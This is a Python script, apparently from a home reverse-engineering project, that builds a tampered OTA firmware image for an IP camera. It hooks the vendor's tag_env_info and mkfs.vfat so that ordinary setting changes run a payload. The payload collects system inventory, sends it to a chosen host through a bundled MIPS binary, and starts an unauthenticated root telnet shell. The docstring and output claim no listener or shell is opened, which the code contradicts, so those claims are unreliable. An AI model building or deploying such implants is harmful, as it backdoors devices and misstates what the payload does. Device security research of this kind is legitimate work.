"""Build a modified /system OTA image that runs a recon script on the camera.

Hook choice — why /system/bin/tag_env_info
------------------------------------------
``ubia_t23`` persists settings by shelling out to ``tag_env_info``::

    0x4b6194  snprintf(buf, 0x64, "tag_env_info --set UBIA md_level %d", v)
    0x4b61b0  system(buf)

That is a **bare name**, so it is resolved through ``PATH``, and the binary ships
in ``/system/bin`` — which means ``/system/bin`` must be on ``PATH`` for the
vendor's own code to work. Dozens of settings go through it (bitrate, flip,
volume, motion level, battery), so it fires on ordinary activity and can be
triggered deliberately by changing any of them.

The first attempt hooked ``/system/mkfs.vfat`` instead and never fired. The
reason is now understood: the format thread reaches ``beqz $s3, 0x4dcab8`` with
``s3`` unconditionally zero (set at 0x4dc494, never rewritten on any path in),
so it always runs the **bare** ``mkfs.vfat`` and never the absolute
``/system/mkfs.vfat`` at 0x4dc824. And ``/system`` — unlike ``/system/bin`` —
is evidently not on ``PATH``. That hook was unreachable by construction.

Both are covered here:
  * ``bin/tag_env_info``  -> wrapper that runs the payload then ``exec``s the
    real binary, so settings still persist and nothing breaks;
  * ``bin/mkfs.vfat``     -> a copy on ``PATH``, so the format path's bare
    lookup now resolves to us as well (bonus trigger, no SD card required);
  * ``mkfs.vfat``         -> **restored to stock**, undoing the first attempt.

Nothing boot-critical is touched. If the payload is broken the worst case is a
setting that fails to persist — the camera still boots, still brings up Wi-Fi
via ``esp32_sdio.ko``, and stays reachable for another OTA.

The payload is reconnaissance only: it writes a text inventory and POSTs it
once, opens no listener, exposes no shell, starts no daemon, and modifies
nothing on the device. It self-limits to one run via a marker in /tmp.

Usage::

    .venv/bin/python tools/build_system_image.py --host <your-lan-ip>
    .venv/bin/python tools/fwflash.py captures/system_hook.img --confirm
    .venv/bin/python tools/recon_run.py --no-trigger    # just listen
"""

from __future__ import annotations

import argparse
import hashlib
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, "scripts")
sys.path.insert(0, "tools")

import mips_sender  # noqa: E402
from ota_image import build, verify  # noqa: E402

MTD4_OFFSET = 0x5B8000
MTD4_SIZE = 1728 * 1024
DUMP = "captures/flash_stock_verified.bin"
OUT = "captures/system_hook.img"

# Runs at most once per boot, fully detached, and never blocks the caller.
# The exfil ladder is deliberately broad because we do not know which network
# applets this vendor busybox actually ships -- wget may simply not exist, which
# is why each hook also carries a network-free proof of execution.
#
# The inventory is generated once, but the SEND is retried on every invocation.
# That matters for iteration: with a once-per-boot guard around the whole thing,
# a single failed send burned the entire boot and the next setting change was a
# no-op. Now any setting change in the app is a fresh attempt.
_RECON = r"""
R=/tmp/rbx_recon.txt
if [ ! -f $R ]; then
  (
    {
      echo "### rbx-s73 recon (via $0)"
      echo "--- id";         id
      echo "--- uname";      uname -a
      echo "--- cmdline";    cat /proc/cmdline
      echo "--- PATH";       echo "$PATH"
      echo "--- rcS";        cat /etc/init.d/rcS
      echo "--- inittab";    cat /etc/inittab
      echo "--- ls /";       ls -la /
      echo "--- ls /bin";    ls -la /bin
      echo "--- ls /sbin";   ls -la /sbin
      echo "--- ls /usr";    ls -la /usr/bin /usr/sbin
      echo "--- ls /system"; ls -la /system /system/bin
      echo "--- applets";    busybox --list
      echo "--- ps";         ps
      echo "--- mtd";        cat /proc/mtd
      echo "--- mounts";     cat /proc/mounts
      echo "--- ifconfig";   ifconfig -a
    } > $R 2>&1
  ) >/dev/null 2>&1
fi
# Interactive root shell. busybox ships telnetd and rcS has it commented out, so
# this just re-enables what the vendor already built. Guarded so repeated
# setting changes do not pile up daemons.
pgrep telnetd >/dev/null 2>&1 || telnetd -l /bin/sh -p __TELNET__
# Retried on every call. rbxsend is our own static MIPS binary in /system/bin
# (on PATH); it exists because this busybox has no network client at all --
# the applet list confirms there is no wget and no nc.
( { echo "### rbxsend-marker"; cat $R; } | /system/bin/rbxsend ) >/dev/null 2>&1 &
"""

# tag_env_info hook. Network-free proof of execution: whenever the caller sets
# md_level, force it to the sentinel 7 regardless of what was asked. Read it
# back with ioType 806 GETMOTIONDETECT -- a value of 7 after requesting
# something else proves this wrapper ran, with no network applet involved.
# Everything else is passed through untouched, so settings keep working.
WRAPPER = "#!/bin/sh\n" + _RECON + r"""
case "$*" in
  *md_level*) exec __REAL__ --set UBIA md_level 7 ;;
esac
exec __REAL__ "$@"
"""

# mkfs.vfat hook, only ever reached when we send ioType 896 ourselves. Its
# network-free proof is a deliberate reboot: if the camera drops and returns
# ~15 s after we trigger a format, this script ran. Safe to do here precisely
# because nothing else invokes it, so it cannot become a boot loop.
STANDALONE = "#!/bin/sh\n" + _RECON + r"""
(sleep 15; reboot) >/dev/null 2>&1 &
exit 0
"""


def run(cmd: list[str]) -> None:
    proc = subprocess.run(cmd, capture_output=True, text=True)
    if proc.returncode != 0:
        raise SystemExit(f"{cmd[0]} failed:\n{proc.stdout}\n{proc.stderr}")


def tree_hashes(root: Path) -> dict[str, str]:
    return {str(p.relative_to(root)): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in sorted(root.rglob("*")) if p.is_file()}


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--dump", default=DUMP)
    ap.add_argument("--out", default=OUT)
    ap.add_argument("--host", required=True, help="this host's LAN IP, baked into the payload")
    ap.add_argument("--http-port", type=int, default=8080)
    ap.add_argument("--telnet-port", type=int, default=2323)
    ap.add_argument("--keep", action="store_true")
    args = ap.parse_args()

    for tool in ("unsquashfs", "mksquashfs"):
        if not shutil.which(tool):
            raise SystemExit(f"{tool} not found (brew install squashfs)")

    dump = Path(args.dump).read_bytes()
    if len(dump) != 8 * 1024 * 1024:
        raise SystemExit(f"{args.dump}: expected an 8 MiB dump, got {len(dump)}")
    stock = dump[MTD4_OFFSET:MTD4_OFFSET + MTD4_SIZE]
    if stock[:4] != b"hsqs":
        raise SystemExit("mtd4 slice is not SquashFS")

    def fill(t):
        return (t.replace("__HOST__", args.host)
                 .replace("__HTTP__", str(args.http_port))
                 .replace("__TELNET__", str(args.telnet_port)))
    recon, wrapper, standalone = fill(_RECON), fill(WRAPPER), fill(STANDALONE)
    assert "__" not in wrapper.replace("__REAL__", ""), "unfilled placeholder"

    work = Path(tempfile.mkdtemp(prefix="rbx-system-"))
    try:
        sqfs = work / "stock.sqfs"
        sqfs.write_bytes(stock)
        tree = work / "tree"
        run(["unsquashfs", "-d", str(tree), "-f", str(sqfs)])
        before = tree_hashes(tree)
        print(f"unpacked {len(before)} files from mtd4 (stock)")

        # 1. Wrap tag_env_info: guaranteed execution, real binary still runs.
        target = tree / "bin" / "tag_env_info"
        if not target.exists():
            raise SystemExit("bin/tag_env_info missing from the stock image")
        target.rename(tree / "bin" / "tag_env_info.real")
        target.write_text(wrapper.replace("__REAL__", "/system/bin/tag_env_info.real"))
        target.chmod(0o755)
        print("hooked bin/tag_env_info (execs bin/tag_env_info.real -- settings still work)")

        # 2. Put a copy on PATH for the format thread's bare `mkfs.vfat` lookup.
        extra = tree / "bin" / "mkfs.vfat"
        extra.write_text(standalone)
        extra.chmod(0o755)
        print("added bin/mkfs.vfat (bare-name lookup now resolves to us)")

        # 3. Ship our own network client, since the device has none.
        sender = tree / "bin" / "rbxsend"
        mips_sender.build(args.host, args.http_port, sender, work)
        sender.chmod(0o755)
        print(f"added bin/rbxsend ({sender.stat().st_size} bytes, static MIPS) "
              f"-> {args.host}:{args.http_port}")

        # 4. /system/mkfs.vfat stays stock (the first attempt is reverted).
        after = tree_hashes(tree)
        changed = {k for k in set(before) | set(after) if before.get(k) != after.get(k)}
        expected = {"bin/tag_env_info", "bin/tag_env_info.real", "bin/mkfs.vfat",
                    "bin/rbxsend"}
        if changed != expected:
            raise SystemExit(f"unexpected delta: {changed ^ expected}")
        print(f"verified: only {sorted(expected)} differ from stock")

        out_sqfs = work / "modified.sqfs"
        run(["mksquashfs", str(tree), str(out_sqfs), "-comp", "xz", "-b", "131072",
             "-noappend", "-no-progress", "-force-uid", "1031", "-force-gid", "1031"])
        blob = out_sqfs.read_bytes()
        print(f"repacked: {len(blob)} bytes  (partition {MTD4_SIZE}, "
              f"headroom {MTD4_SIZE - len(blob)})")
        if len(blob) > MTD4_SIZE:
            raise SystemExit("repacked image does not fit the partition")

        image = build(blob)
        result = verify(image)
        if not result.ok:
            raise SystemExit(f"built an invalid container: {result.reason}")
        Path(args.out).write_bytes(image)
        print(f"\nwrote {args.out}: {len(image)} bytes")
        print(result)
        print(f"\npayload posts once to http://{args.host}:{args.http_port}/recon; "
              f"opens nothing on the camera")
        print("triggers: any setting change (motion level, flip, volume, bitrate), "
              "or ioType 896")
    finally:
        if args.keep:
            print(f"work dir kept: {work}")
        else:
            shutil.rmtree(work, ignore_errors=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
